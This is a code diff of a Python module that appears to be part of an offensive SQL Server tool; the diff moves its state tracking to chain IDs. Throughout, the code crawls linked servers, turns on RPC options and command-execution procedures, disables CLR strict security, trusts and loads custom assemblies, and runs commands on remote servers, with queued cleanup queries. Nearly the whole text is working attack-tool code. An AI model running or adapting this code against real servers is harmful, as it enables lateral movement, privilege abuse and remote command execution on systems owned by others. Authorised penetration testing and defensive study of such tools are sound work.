@@ -1,17 +1,15 @@
 ########################################################
 __author__ = ['Nimrod Levy']
 __license__ = 'GPL v3'
-__version__ = 'v1.1'
+__version__ = 'v1.2'
 __email__ = ['El3ct71k@gmail.com']
 
 ########################################################
 import os
-import copy
 import utilities
 from impacket import LOG
-from typing import Callable
 from playbooks import Queries
-from typing import Literal, Any
+from typing import Literal, Any, Union
 from classes.base_sql_client import BaseSQLClient
 
 
@@ -31,22 +29,21 @@ class Operations(BaseSQLClient):
 
         self.rev2self = dict()
         self.max_recursive_links = args_options.max_recursive_links
-        self.current_chain_id = 1
-        self.chain_id = args_options.chain_id
         self.auto_yes = args_options.auto_yes
         self.custom_asm_directory = os.path.join('playbooks', 'custom-asm')
 
-    def add_to_server_state(self, linked_server: str, key: str, value: Any):
+    def add_to_server_state(self, chain_id: Union[str, None], key: str, value: Any) -> str:
         """
             This function is responsible to add the server items to the server state.
         """
 
-        if linked_server not in self.state['servers_info'].keys():
-            self.state['servers_info'][linked_server] = {
+        if not chain_id:
+            chain_id = utilities.generate_link_id()
+            self.state['servers_info'][chain_id] = {
                 "hostname": "",
-                "chain_str": linked_server,
-                "previous_chain_str": "",
+                "chain_str": "",
                 "chain_tree": list(),
+                "chain_tree_ids": list(),
                 "db_user": "",
                 "db_name": "",
                 "server_user": "",
@@ -54,35 +51,34 @@ class Operations(BaseSQLClient):
                 "instance_name": "",
                 "version": "",
                 "domain_name": "",
-                "chain_id": self.current_chain_id,
+                "chain_id": chain_id,
                 "server_principals": set(),
                 "database_principals": set(),
                 "server_roles": set(),
                 "database_roles": set(),
                 "trustworthy_db_list": set(),
-                "adsi_providers": set(),
-                "server_principals_history": set(),
-                "database_principals_history": set()
-
+                "adsi_providers": set()
             }
 
-        if isinstance(self.state['servers_info'][linked_server][key], list):
+        if key not in self.state['servers_info'][chain_id].keys():
+            raise Exception(f"Key {key} is not in the server state.")
+
+        server_info = self.state['servers_info'][chain_id][key]
+        if isinstance(server_info, list) or isinstance(server_info, set):
             if not isinstance(value, list):
                 value = [value]
             for v in value:
-                self.state['servers_info'][linked_server][key].append(v)
+                if isinstance(server_info, list):
+                    self.state['servers_info'][chain_id][key].append(v)
+                else:
+                    self.state['servers_info'][chain_id][key].add(v)
 
-        elif isinstance(self.state['servers_info'][linked_server][key], set):
-            if not isinstance(value, set):
-                value = [value]
-            for v in value:
-                self.state['servers_info'][linked_server][key].add(v)
-
-        elif isinstance(self.state['servers_info'][linked_server][key], dict):
+        elif isinstance(server_info, dict):
             for k, v in value.items():
-                self.state['servers_info'][linked_server][key][k] = v
+                self.state['servers_info'][chain_id][key][k] = v
         else:
-            self.state['servers_info'][linked_server][key] = value
+            self.state['servers_info'][chain_id][key] = value
+        return chain_id
 
     def filter_server_by_link_name(self, link_name: str) -> list:
         """
@@ -92,99 +88,79 @@ class Operations(BaseSQLClient):
         if not link_information:
             return []
         link_information = link_information[0]
-        hosts = utilities.filter_subdict_by_key(self.state['servers_info'], "hostname", link_information['hostname'])
-        filtered_by_domain = utilities.filter_dict_by_key(hosts, "domain_name", link_information['domain_name'])
-        return utilities.sort_dict_by_key(filtered_by_domain, "chain_id")
+        servers = utilities.filter_subdict_by_key(self.state['servers_info'], "hostname", link_information['hostname'])
+        for server in servers:
+            if server['domain_name'] != link_information['domain_name']:
+                continue
+            yield server
 
-    def filter_server_by_chain_str(self, chain_str: str) -> list:
+    def generate_chain_str(self, chain_id: str):
         """
-            This function is responsible to filter the server by chain.
+            This function is responsible to generates chain string by chain id.
         """
-        return utilities.filter_subdict_by_key(self.state['servers_info'], "chain_str", chain_str)
+        server_info = self.state['servers_info'][chain_id]
+        if not server_info['chain_tree']:
+            return server_info['hostname']
 
-    def filter_server_by_chain_id(self, chain_id: int) -> list:
-        """
-            This function is responsible to filter the server by chain id.
-        """
-        return utilities.filter_subdict_by_key(self.state['servers_info'], "chain_id", chain_id)
+        chain_str = server_info['chain_tree'][0]
 
-    def sort_servers_by_chain_id(self) -> list:
-        """
-            This function is responsible to sort the servers by chain id.
-        """
-        return utilities.sort_dict_by_key(self.state['servers_info'].values(), "chain_id")
+        for link_name in server_info['chain_tree'][1:]:
+            chain_str += f" -> {link_name}"
+        return chain_str
 
-    def get_title(self, linked_server):
+    def get_title(self, chain_id: str):
         """
-            This function is responsible to get chain or linked server title.
+            This function is responsible to generates chain title by chain id.
         """
-        if self.chain_id:
-            filtered_servers = self.filter_server_by_chain_id(self.chain_id)
-        else:
-            filtered_servers = self.filter_server_by_link_name(linked_server)
-
-        chain_str = filtered_servers[0]['chain_str']
-        user_name = filtered_servers[0]['server_user']
-        db_user = filtered_servers[0]['db_user']
-        db_name = filtered_servers[0]['db_name']
+        server_info = self.state['servers_info'][chain_id]
+        chain_str = self.generate_chain_str(chain_id)
+        user_name = server_info['server_user']
+        db_user = server_info['db_user']
+        db_name = server_info['db_name']
         return f"{chain_str} ({user_name} {db_user}@{db_name})"
 
-    def is_valid_chain_id(self) -> bool:
+    def is_valid_chain_id(self, chain_id: str) -> bool:
         """
             This function is responsible to check if the given chain id is valid.
         """
-        if self.chain_id:
-            filtered_servers = self.filter_server_by_chain_id(self.chain_id)
+        if chain_id not in self.state['servers_info']:
+            LOG.error(f"Chain id {chain_id} is not in the chain ids list")
+            return False
 
-            if not filtered_servers:
-                LOG.error(f"Chain id {self.chain_id} is not in the chain ids list")
-                return False
-            chain_str = filtered_servers[0]['chain_str']
-            LOG.info(f"Chosen chain: {chain_str} (ID: {self.chain_id})")
+        chain_str = self.generate_chain_str(chain_id)
+        LOG.info(f"Chosen chain: {chain_str} (ID: {chain_id})")
         return True
 
-    def is_valid_link_server(self, linked_server: str) -> bool:
+    def is_valid_link_server(self, link_name: str) -> bool:
         """
             This function is responsible to check if the given linked server is valid.
         """
 
-        filtered_servers = self.filter_server_by_link_name(linked_server)
+        filtered_servers = list(self.filter_server_by_link_name(link_name))
 
         if not filtered_servers:
-            LOG.error(f"{linked_server} is not in the linked servers list")
+            LOG.error(f"{link_name} is not in the linked servers list")
             return False
-        LOG.info(f"Chosen linked server: {linked_server}")
+        LOG.info(f"Chosen linked server: {link_name}")
         return True
 
-    def is_link_in_state(self, link_server, state) -> bool:
+    def is_link_in_chain(self, chain_id: str) -> bool:
         """
             This function is responsible to check if the given linked server is in the state.
         """
-        if not state:
-            return False
 
-        # Link: CDC01 | state[-1]: CDC01.PROD.CORP1.COM
-        if link_server == state[-1].split(".")[0]:
-            return True
+        current_server_info = self.state['servers_info'][chain_id]
+        hosts_list = []
+        for captured_chain in current_server_info['chain_tree_ids']:
+            server_info = self.state['servers_info'][captured_chain]
+            hosts_list.append(f"{server_info['hostname']}.{server_info['domain_name']}")
 
-        new_server = self.filter_server_by_link_name(link_server)
-
-        if not new_server:
-            return False
-        counter = 1
-        for captured_link in state:
-            server_info = self.filter_server_by_link_name(captured_link)
-            if not server_info:
-                LOG.error(f"{captured_link} is not in the linked servers list")
-                continue
-            if server_info[0]['hostname'] == new_server[0]['hostname']:
-                if server_info[0]['domain_name'] == new_server[0]['domain_name']:
-                    if counter >= 2:
-                        return True
-                    counter += 1
+        for host in hosts_list:
+            if hosts_list.count(host) > 2:
+                return True
         return False
 
-    def detect_architecture(self, linked_server: str, arch: Literal['autodetect', 'x64', 'x86']) -> str:
+    def detect_architecture(self, chain_id: str, arch: Literal['autodetect', 'x64', 'x86']) -> Union[str, None]:
         """
             This function is responsible to detect the architecture of a remote server.
         """
@@ -192,38 +168,42 @@ class Operations(BaseSQLClient):
             LOG.info(f"Architecture is set to {arch}")
             return arch
 
-        for server_info in self.filter_server_by_chain_str(linked_server):
-            LOG.info(f"Find architecture in {server_info['chain_str']}")
-            for x64_sig in ["<x64>", "(X64)", "(64-bit)"]:
-                if x64_sig in server_info['version']:
-                    LOG.info("Architecture is x64")
-                    return "x64"
-            for x86_sig in ["<x86>", "(X86)", "(32-bit)"]:
-                if x86_sig in server_info['version']:
-                    LOG.info("Architecture is x86")
-                    return "x86"
-        return ""
+        server_info = self.state['servers_info'][chain_id]
+        chain_str = self.generate_chain_str(chain_id)
+        LOG.info(f"Find architecture in {chain_str}")
+        for x64_sig in ["<x64>", "(X64)", "(64-bit)"]:
+            if x64_sig in server_info['version']:
+                LOG.info("Architecture is x64")
+                return "x64"
+        for x86_sig in ["<x86>", "(X86)", "(32-bit)"]:
+            if x86_sig in server_info['version']:
+                LOG.info("Architecture is x86")
+                return "x86"
+        return None
 
-    def is_privileged_server_user(self, linked_server: str) -> bool:
-        if self.state['servers_info'][linked_server]['server_user'] in self.high_privileged_server_roles:
-            return True
-        if utilities.is_string_in_lists(self.state['servers_info'][linked_server]['server_principals'],
-                                        self.high_privileged_server_principals):
-            return True
-        return utilities.is_string_in_lists(self.state['servers_info'][linked_server]['server_roles'],
-                                            self.high_privileged_server_roles)
+    def is_privileged_user(self, chain_id: str, user_type: Literal['server', 'database']) -> bool:
+        """
+            This function is responsible to check if the given user is privileged.
+        """
 
-    def is_privileged_db_user(self, linked_server: str) -> bool:
-        if self.state['servers_info'][linked_server]['db_user'] in self.high_privileged_server_roles:
-            return True
-        if utilities.is_string_in_lists(self.state['servers_info'][linked_server]['database_principals'],
-                                        self.high_privileged_database_principals):
-            return True
-        return utilities.is_string_in_lists(self.state['servers_info'][linked_server]['database_roles'],
-                                            self.high_privileged_database_roles)
+        server_info = self.state['servers_info'][chain_id]
+        current_user = server_info['server_user'] if user_type == 'server' else server_info['db_user']
+        high_privileged_roles = self.high_privileged_server_roles \
+            if user_type == 'server' else self.high_privileged_database_roles
+        high_privileged_principals = self.high_privileged_server_principals \
+            if user_type == 'server' else self.high_privileged_database_principals
 
-    def retrieve_server_information(self, linked_server: str = None, linked_server_name: str = None,
-                                    previous_chain_str: str = None) -> bool:
+        user_principals = server_info['server_principals'] if user_type == 'server' \
+            else server_info['database_principals']
+        user_roles = server_info['server_roles'] if user_type == 'server' else server_info['database_roles']
+
+        if current_user in high_privileged_roles:
+            return True
+        if utilities.is_string_in_lists(user_principals, high_privileged_principals):
+            return True
+        return utilities.is_string_in_lists(user_roles, high_privileged_roles)
+
+    def retrieve_server_information(self, chain_id: Union[str, None], link_name: Union[str, None]) -> Union[str, None]:
         """
             This function is responsible to retrieve the server information.
         """
@@ -237,13 +217,15 @@ class Operations(BaseSQLClient):
         }
         required_queries = ["server_information"]
         dict_results = {}
+        chain_str = self.generate_chain_str(chain_id) if chain_id else self.server_address
+        LOG.info(f"Retrieve server information from {chain_str}")
         for key, query in queries.items():
-            results = self.build_chain(query, linked_server)
+            results = self.build_chain(chain_id, query)
 
             if not results['is_success']:
                 if key in required_queries:
-                    LOG.error(f"Failed to retrieve {key} from {linked_server}")
-                    return False
+                    LOG.error(f"Failed to retrieve {key} from {chain_str}")
+                    return None
                 continue
             dict_results[key] = results['results']
 
@@ -251,43 +233,45 @@ class Operations(BaseSQLClient):
         server_user = dict_results['server_information'][0]['server_user']
         db_name = dict_results['server_information'][0]['db_name']
 
-        hostname = utilities.remove_service_name(dict_results['server_information'][0]['hostname'])
+        hostname = utilities.remove_instance_name(dict_results['server_information'][0]['hostname'])
 
         domain_name = dict_results['server_information'][0]['domain_name']
         server_version = dict_results['server_information'][0]['server_version']
         instance_name = dict_results['server_information'][0]['instance_name']
 
-        if not linked_server:
-            self.state['local_hostname'] = hostname
+        if not link_name:
             LOG.info(f"Discovered hostname: {hostname}")
-            linked_server = hostname
-        linked_server_name = linked_server_name if linked_server_name else hostname
-        for k, v in {"hostname": hostname, "link_name": linked_server_name, "db_user": db_user,
+            self.state['hostname'] = hostname
+            chain_id = self.add_to_server_state(chain_id, "chain_tree", hostname)
+            self.add_to_server_state(chain_id, "chain_tree_ids", [chain_id])
+
+        link_name = link_name if link_name else hostname
+
+        for k, v in {"hostname": hostname, "link_name": link_name, "db_user": db_user,
                      "server_user": server_user, "version": server_version, "db_name": db_name,
                      "domain_name": domain_name, "instance_name": instance_name}.items():
-
-            self.add_to_server_state(linked_server, k, v)
+            chain_id = self.add_to_server_state(chain_id, k, v)
 
         if 'trustworthy_db_list' in dict_results.keys():
             for db_name in dict_results['trustworthy_db_list']:
-                self.add_to_server_state(linked_server, "trustworthy_db_list", db_name['name'])
+                chain_id = self.add_to_server_state(chain_id, "trustworthy_db_list", db_name['name'])
 
         if 'server_roles' in dict_results.keys():
             for server_role in dict_results['server_roles']:
-                self.add_to_server_state(linked_server, "server_roles", server_role['group'])
+                chain_id = self.add_to_server_state(chain_id, "server_roles", server_role['group'])
 
         if 'db_roles' in dict_results.keys():
             for db_role in dict_results['db_roles']:
-                self.add_to_server_state(linked_server, "database_roles", db_role['group'])
+                chain_id = self.add_to_server_state(chain_id, "database_roles", db_role['group'])
 
         if 'server_principals' in dict_results.keys():
             for server_principal in dict_results['server_principals']:
                 if server_principal['username'] == server_user:
                     continue
                 if server_principal['permission_name'] != 'IMPERSONATE':
-                    if not self.is_privileged_server_user(linked_server):
+                    if not self.is_privileged_user(chain_id, 'server'):
                         continue
-                self.add_to_server_state(linked_server, "server_principals", server_principal['username'])
+                chain_id = self.add_to_server_state(chain_id, "server_principals", server_principal['username'])
 
         if 'db_principals' in dict_results.keys():
             for db_principal in dict_results['db_principals']:
@@ -295,60 +279,79 @@ class Operations(BaseSQLClient):
                     continue
 
                 if db_principal['permission_name'] != 'IMPERSONATE':
-                    if not self.is_privileged_db_user(linked_server):
+                    if not self.is_privileged_user(chain_id, 'database'):
                         continue
-                self.add_to_server_state(linked_server, "database_principals", db_principal['username'])
-        if previous_chain_str:
-            self.add_to_server_state(linked_server, "previous_chain_str", previous_chain_str)
-        self.current_chain_id += 1
-        return True
+                chain_id = self.add_to_server_state(chain_id, "database_principals", db_principal['username'])
+        chain_id = self.add_to_server_state(chain_id, "chain_str", self.generate_chain_str(chain_id))
+        return chain_id
 
-    def retrieve_links(self, linked_server: str = None, old_state: list = None) -> None:
+    def set_server_options(self, chain_id: str, link_name: str, feature: str, status: Literal['true', 'false']) -> None:
+        """
+            This function is responsible to set the server options.
+        """
+        chain_str = self.generate_chain_str(chain_id)
+        LOG.info(f"Set {feature} to {status} on {chain_str}")
+        set_server_option = self.build_chain(chain_id, Queries.SET_SERVER_OPTION.format(link_name=link_name,
+                                                                                        feature=feature, status=status),
+                                             method="exec_at")
+        if set_server_option['is_success']:
+            rev2sef_status = 'true' if status == 'false' else 'false'
+            self.add_rev2self_query(chain_id, Queries.SET_SERVER_OPTION.format(link_name=link_name,
+                                                                               feature=feature, status=rev2sef_status),
+                                    template=set_server_option['template'], iterations=set_server_option['iterations'])
+
+    def retrieve_links(self, chain_id: str) -> None:
         """
             This function is responsible to retrieve all the linkable servers recursively.
         """
-        if not linked_server:
-            linked_server = self.state['local_hostname']
-        state = copy.copy(old_state)
-        state = state if state else [linked_server]
-        rows = self.build_chain(Queries.GET_LINKABLE_SERVERS, linked_server)
-        if not rows['is_success']:
-            LOG.warning(f"Failed to retrieve linkable servers from {linked_server}")
+        server_info = self.state['servers_info'][chain_id]
+        chain_str = self.generate_chain_str(chain_id)
+
+        linkable_servers_results = self.build_chain(chain_id, Queries.GET_LINKABLE_SERVERS)
+        if not linkable_servers_results['is_success']:
+            LOG.warning(f"Failed to retrieve linkable servers from {chain_str}")
             return
 
-        if not rows['results']:
-            LOG.info(f"No linkable servers found on {linked_server}")
-            return
+        for row in linkable_servers_results['results']:
 
-        for row in rows['results']:
-            if not row['SRV_NAME']:
+            link_name = utilities.remove_instance_name(row['name'])
+
+            if row['provider'].lower() == "adsdsoobject":
+                self.add_to_server_state(chain_id, "adsi_providers", link_name)
                 continue
 
-            linkable_server = utilities.remove_service_name(row['SRV_NAME'])
-            if row['SRV_PROVIDERNAME'].lower() == "adsdsoobject":
-                self.add_to_server_state(linked_server, "adsi_providers", linkable_server)
+            if not row['is_remote_login_enabled']:
+                LOG.info(f"Remote login is disabled on {link_name}")
+                self.set_server_options(chain_id, link_name, 'rpc', 'true')
+            if not row['is_rpc_out_enabled']:
+                LOG.info(f"RPC out is disabled on {link_name}")
+                self.set_server_options(chain_id, link_name, 'rpc out', 'true')
+
+            chain_str = f"{' -> '.join(server_info['chain_tree'])} -> {link_name}".lstrip(" -> ")
+            new_chain_id = self.add_to_server_state(None, "chain_tree", server_info['chain_tree'] + [link_name])
+            self.add_to_server_state(new_chain_id, "chain_tree_ids", server_info['chain_tree_ids'] + [new_chain_id])
+
+            if not new_chain_id or not self.retrieve_server_information(new_chain_id, link_name):
+                LOG.error(f"Failed to retrieve server information from {chain_str}")
+                del self.state['servers_info'][new_chain_id]
                 continue
 
-            if self.is_link_in_state(linkable_server, state):
+            if self.is_link_in_chain(new_chain_id):
+                chain_str = self.generate_chain_str(chain_id)
+                LOG.info(f"Link {link_name} already in chain {chain_str}")
+                del self.state['servers_info'][new_chain_id]
                 continue
-
-            linkable_chain_str = f"{' -> '.join(state)} -> {linkable_server}"
-
-            self.add_to_server_state(linkable_chain_str, "chain_tree", state + [linkable_server])
-            self.add_to_server_state(linkable_chain_str, "link_name", linkable_server)
-
-            if not self.retrieve_server_information(linkable_chain_str, linkable_server, linked_server):
-                del self.state['servers_info'][linkable_chain_str]
+            if len(self.state['servers_info'][new_chain_id]['chain_tree']) > self.max_recursive_links:
+                LOG.info(f"Reached max depth for chain {chain_str} (Max depth: {self.max_recursive_links})")
                 continue
+            self.retrieve_links(new_chain_id)
 
-            self.retrieve_links(linkable_chain_str, state + [linkable_server])
-
-    def direct_query(self, query: str, linked_server: str, method: Literal['OpenQuery', 'exec_at'] = "OpenQuery",
+    def direct_query(self, chain_id: str, query: str, method: Literal['OpenQuery', 'exec_at'] = "OpenQuery",
                      decode_results: bool = True, print_results: bool = False) -> bool:
         """
             This function is responsible to execute a query directly.
         """
-        results = self.build_chain(query, linked_server, method, decode_results, print_results)
+        results = self.build_chain(chain_id, query, method, decode_results, print_results)
         if not results['is_success']:
             LOG.error(f"Failed to execute query: {query}")
             return False
@@ -363,28 +366,13 @@ class Operations(BaseSQLClient):
 
         return True
 
-    def can_impersonate(self, linked_server: str) -> bool:
-        """
-        This function is responsible to check if we can impersonate as other users.
-        """
-        if linked_server in self.state['servers_info'].keys():
-            for db_principal in self.state['servers_info'][linked_server]['database_principals']:
-                if db_principal not in self.state['servers_info'][linked_server]['database_principals_history']:
-                    return True
-        if linked_server in self.state['servers_info'].keys():
-            if self.state['servers_info'][linked_server]['server_principals']:
-                for server_principal in self.state['servers_info'][linked_server]['server_principals']:
-                    if server_principal not in self.state['servers_info'][linked_server]['server_principals_history']:
-                        return True
-        return False
-
-    def reconfigure_procedure(self, procedure: str, linked_server: str, required_status: bool) -> bool:
+    def reconfigure_procedure(self, chain_id: str, procedure: str, required_status: bool) -> bool:
         """
         This function is responsible to enable a procedure on the server.
         """
         procedure_custom_name = utilities.retrieve_procedure_custom_name(procedure)
-        is_procedure_enabled = self.build_chain(Queries.IS_PROCEDURE_ENABLED.format(procedure=procedure_custom_name),
-                                                linked_server)
+        is_procedure_enabled = self.build_chain(chain_id,
+                                                Queries.IS_PROCEDURE_ENABLED.format(procedure=procedure_custom_name))
 
         if not is_procedure_enabled['is_success']:
             LOG.error(f"Cant fetch is_{procedure}_enabled status")
@@ -397,33 +385,35 @@ class Operations(BaseSQLClient):
         if is_procedure_enabled['results'] and is_procedure_enabled['results'][-1]['procedure'] != str(required_status):
             LOG.warning(
                 f"{procedure} need to be changed (Resulted status: {is_procedure_enabled['results'][-1]['procedure']})")
-            if not self.is_privileged_server_user(linked_server):
-                is_procedure_can_be_configured = self.build_chain(Queries.IS_UPDATE_SP_CONFIGURE_ALLOWED, linked_server)
+            if not self.is_privileged_user(chain_id, 'server'):
+                is_procedure_can_be_configured = self.build_chain(chain_id, Queries.IS_UPDATE_SP_CONFIGURE_ALLOWED)
                 if (not is_procedure_can_be_configured['is_success']) or \
                         is_procedure_can_be_configured['results'][0]['CanChangeConfiguration'] == 'False':
                     LOG.error(f"Cant fetch sp_configure status")
                     return False
 
             LOG.info(f"{procedure} can be configured")
-            query = ""
             status = 1 if required_status else 0
             rev2self_status = 0 if required_status else 1
-            query += Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure_custom_name, status=status)
+            query = Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure_custom_name, status=status)
             LOG.info(f"Reconfiguring {procedure}")
-            self.add_rev2self_query(linked_server,
-                                    Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure, status=rev2self_status))
-
-            if not self.build_chain(query, linked_server, method="exec_at")['is_success']:
+            reconfigure_procedure = self.build_chain(chain_id, query, method="exec_at")
+            if reconfigure_procedure['is_success']:
+                self.add_rev2self_query(chain_id,
+                                        Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure,
+                                                                             status=rev2self_status),
+                                        template=reconfigure_procedure['template'],
+                                        iterations=reconfigure_procedure['iterations'])
+            else:
                 LOG.warning(f"Failed to enable {procedure}")
         return True
 
-    def execute_procedure(self, procedure: str, command: str, linked_server: str, reconfigure: bool = False) -> bool:
+    def execute_procedure(self, chain_id: str, procedure: str, command: str, reconfigure: bool = False) -> bool:
         """
         This function is responsible to execute a procedure on a linked server.
         """
-        is_procedure_accessible = self.build_chain(
-            Queries.IS_PROCEDURE_ACCESSIBLE.format(procedure=procedure),
-            linked_server)
+        is_procedure_accessible = self.build_chain(chain_id,
+                                                   Queries.IS_PROCEDURE_ACCESSIBLE.format(procedure=procedure))
 
         if (not is_procedure_accessible['is_success']) or \
                 is_procedure_accessible['results'][0]['is_accessible'] != 'True':
@@ -431,10 +421,10 @@ class Operations(BaseSQLClient):
             return False
 
         if reconfigure:
-            if not self.reconfigure_procedure("show advanced options", linked_server, required_status=True):
+            if not self.reconfigure_procedure(chain_id, "show advanced options", required_status=True):
                 return False
 
-            if not self.reconfigure_procedure(procedure, linked_server, required_status=True):
+            if not self.reconfigure_procedure(chain_id, procedure, required_status=True):
                 return False
 
         if procedure == 'sp_oacreate':
@@ -442,84 +432,99 @@ class Operations(BaseSQLClient):
         else:
             procedure_query = Queries.PROCEDURE_EXECUTION.format(procedure=procedure, command=command)
 
-        results = self.build_chain(procedure_query, linked_server, method="exec_at")
-        if not results['is_success']:
-            LOG.warning(f"Failed to execute {procedure} on {linked_server}")
+        execute_procedure_res = self.build_chain(chain_id, procedure_query, method="exec_at")
+        chain_str = self.generate_chain_str(chain_id)
+        if not execute_procedure_res['is_success']:
+            LOG.warning(f"Failed to execute {procedure} on {chain_str}")
             if not reconfigure:
-                return self.execute_procedure(procedure, command, linked_server, reconfigure=True)
+                return self.execute_procedure(chain_id, procedure, command, reconfigure=True)
             return False
 
-        LOG.info(f"The {procedure} command executed successfully on {linked_server}")
-        if not results['results']:
+        LOG.info(f"The {procedure} command executed successfully on {chain_str}")
+        if not execute_procedure_res['results']:
             LOG.warning("Failed to resolve the results")
-            return results['is_success']
+            return True
 
-        for result in results['results']:
+        for result in execute_procedure_res['results']:
             for key, value in result.items():
                 LOG.info(f"Result: (Key: {key}) {value}")
         return True
 
-    def add_new_custom_asm(self, asm_file_location: str, linked_server: str, asm_name: str):
+    def add_new_custom_asm(self, chain_id: str, asm_file_location: str, asm_name: str) -> bool:
         """
         This function is responsible to add a new custom assembly to the server.
         """
         if not os.path.exists(asm_file_location):
             LOG.error(f"Cannot find {asm_file_location}")
             return False
+        is_asm_exists = self.build_chain(chain_id, Queries.IS_ASSEMBLY_EXISTS.format(asm_name=asm_name))
+        if is_asm_exists['is_success'] and is_asm_exists['results'][0]['status'] == 'True':
+            LOG.info(f"{asm_name} assembly is already exists")
+            return True
 
         custom_asm_hex = utilities.hexlify_file(asm_file_location)
-        if not self.reconfigure_procedure('show advanced options', linked_server, required_status=True):
+        if not self.reconfigure_procedure(chain_id, 'show advanced options', required_status=True):
             LOG.error("Failed to enable show advanced options")
             return False
 
-        if not self.reconfigure_procedure('clr enabled', linked_server, required_status=True):
+        if not self.reconfigure_procedure(chain_id, 'clr enabled', required_status=True):
             LOG.error("Failed to enable clr")
             return False
 
-        if not self.reconfigure_procedure('clr strict security', linked_server, required_status=False):
+        if not self.reconfigure_procedure(chain_id, 'clr strict security', required_status=False):
             LOG.error("Failed to disable clr strict security")
             return False
 
         my_hash = utilities.calculate_sha512_hash(asm_file_location)
-        is_app_trusted = self.build_chain(Queries.IS_MY_APP_TRUSTED.format(my_hash=my_hash), linked_server)
+        is_app_trusted = self.build_chain(chain_id, Queries.IS_MY_APP_TRUSTED.format(my_hash=my_hash))
 
         if (not is_app_trusted['is_success']) or (is_app_trusted['results'][0]['status'] == 'False'):
-            trust_asm = self.build_chain(Queries.TRUST_MY_APP.format(my_hash=my_hash), linked_server, method="exec_at")
+            trust_asm = self.build_chain(chain_id, Queries.TRUST_MY_APP.format(my_hash=my_hash), method="exec_at")
             if not trust_asm['is_success']:
                 LOG.error("Failed to trust our custom assembly")
                 return False
 
             LOG.info(f"Trusting our custom assembly")
-            self.add_rev2self_query(linked_server, Queries.UNTRUST_MY_APP.format(my_hash=my_hash))
-        add_custom_asm = self.build_chain(Queries.ADD_CUSTOM_ASM.format(custom_asm=custom_asm_hex, asm_name=asm_name),
-                                          linked_server, method="exec_at")
-        if (not add_custom_asm['is_success']) and 'already exists in database' not in add_custom_asm['replay']:
+            self.add_rev2self_query(chain_id, Queries.UNTRUST_MY_APP.format(my_hash=my_hash),
+                                    template=trust_asm['template'], iterations=trust_asm['iterations'])
+        add_custom_asm = self.build_chain(chain_id,
+                                          Queries.ADD_CUSTOM_ASM.format(custom_asm=custom_asm_hex, asm_name=asm_name),
+                                          method="exec_at", indicates_success=['already exists in database'])
+        if not add_custom_asm['is_success']:
             LOG.error(f"Failed to add custom assembly")
             return False
+        self.add_rev2self_query(chain_id, Queries.DROP_ASSEMBLY.format(asm_name='FuncAsm'),
+                                template=add_custom_asm['template'], iterations=add_custom_asm['iterations'])
+        LOG.info(f"Added custom assembly")
         return True
 
-    def execute_custom_assembly_procedure(self, asm_file_location: str, procedure_name: str, command: str,
-                                          asm_name: str, linked_server: str) -> bool:
+    def execute_custom_assembly_procedure(self, chain_id: str, asm_file_location: str, procedure_name: str,
+                                          command: str, asm_name: str) -> bool:
         """
         This function is responsible to execute a custom assembly.
         In general this function is starts with creates the assembly, trust it, create the procedure and execute it.
         """
 
-        if not self.add_new_custom_asm(asm_file_location, linked_server, asm_name):
+        if not self.add_new_custom_asm(chain_id, asm_file_location, asm_name):
             return False
+        is_proc_exists = self.build_chain(chain_id, Queries.IS_PROCEDURE_EXISTS.format(procedure_name=procedure_name))
+        if is_proc_exists['is_success'] and is_proc_exists['results'][0]['status'] == 'True':
+            LOG.info(f"{procedure_name} procedure is already exists")
+        else:
+            add_procedure = self.build_chain(chain_id,
+                                             Queries.CREATE_PROCEDURE.format(asm_name=asm_name,
+                                                                             procedure_name=procedure_name,
+                                                                             arg='command'),
+                                             method="exec_at", indicates_success=['is already an object named'])
 
-        add_procedure = self.build_chain(Queries.CREATE_PROCEDURE.format(asm_name=asm_name,
-                                                                         procedure_name=procedure_name, arg='command'),
-                                         linked_server, method="exec_at")
-
-        if (not add_procedure['is_success']) and 'is already an object named' not in add_procedure['replay']:
-            LOG.error(f"Failed to create procedure")
-            return False
-        self.add_rev2self_query(linked_server, Queries.DROP_PROCEDURE.format(procedure_name=procedure_name))
-        self.add_rev2self_query(linked_server, Queries.DROP_ASSEMBLY.format(asm_name=asm_name))
+            if not add_procedure['is_success']:
+                LOG.error(f"Failed to create procedure")
+                return False
+            self.add_rev2self_query(chain_id, Queries.DROP_PROCEDURE.format(procedure_name=procedure_name),
+                                    template=add_procedure['template'], iterations=add_procedure['iterations'])
 
         procedure_query = Queries.PROCEDURE_EXECUTION.format(procedure=procedure_name, command=command)
-        results = self.build_chain(procedure_query, linked_server, method="exec_at")
+        results = self.build_chain(chain_id, procedure_query, method="exec_at")
         if not results['is_success']:
             LOG.error(f"Failed to execute custom assembly")
             return False
@@ -528,134 +533,64 @@ class Operations(BaseSQLClient):
                 LOG.info(f"Result: (Key: {key}) {value}")
         return True
 
-    def execute_custom_assembly_function(self, asm_file_location: str, function_name: str, class_name: str,
-                                         namespace: str, command: str, linked_server: str) -> bool:
+    def execute_custom_assembly_function(self, chain_id: str, asm_file_location: str, function_name: str,
+                                         class_name: str, namespace: str, command: str,
+                                         wait: bool = True) -> Union[None, dict]:
         """
         This function is responsible to execute a custom assembly.
         In general this function is starts with creates the assembly, trust it, create the function and execute it.
         """
 
-        if not self.add_new_custom_asm(asm_file_location, linked_server, "FuncAsm"):
-            return False
-        add_function = self.build_chain(Queries.CREATE_FUNCTION.format(
-            function_name=function_name, asm_name='FuncAsm', namespace=namespace,
-            class_name=class_name, arg="@port int"),
-            linked_server, method="exec_at")
+        if not self.add_new_custom_asm(chain_id, asm_file_location, "FuncAsm"):
+            return None
+        is_func_exists = self.build_chain(chain_id, Queries.IS_FUNCTION_EXISTS.format(function_name=function_name))
+        if is_func_exists['is_success'] and is_func_exists['results'][0]['status'] == 'True':
+            LOG.info(f"{function_name} function is already exists")
+        else:
+            add_function = self.build_chain(chain_id,
+                                            Queries.CREATE_FUNCTION.format(
+                                                function_name=function_name, asm_name='FuncAsm', namespace=namespace,
+                                                class_name=class_name, arg="@port int"),
+                                            method="exec_at", indicates_success=['already an object named'])
 
-        self.add_rev2self_query(linked_server, Queries.DROP_FUNCTION.format(function_name=function_name))
-        self.add_rev2self_query(linked_server, Queries.DROP_ASSEMBLY.format(asm_name='FuncAsm'))
-        if (not add_function['is_success']) and 'already an object named' not in add_function['replay']:
-            LOG.error(f"Failed to create procedure")
-            return False
+            if not add_function['is_success']:
+                LOG.error(f"Failed to create procedure")
+                return None
